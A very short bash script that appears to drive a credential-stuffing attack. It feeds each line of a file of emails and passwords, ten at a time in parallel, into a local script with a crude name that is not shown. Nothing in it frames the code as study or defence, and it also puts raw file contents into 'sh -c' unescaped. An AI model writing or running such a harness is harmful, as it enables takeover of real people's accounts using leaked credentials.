#!/bin/bash
cat emails_passwords.txt | xargs -I {} -P 10 sh -c 'echo {} | ./fucker.sh'
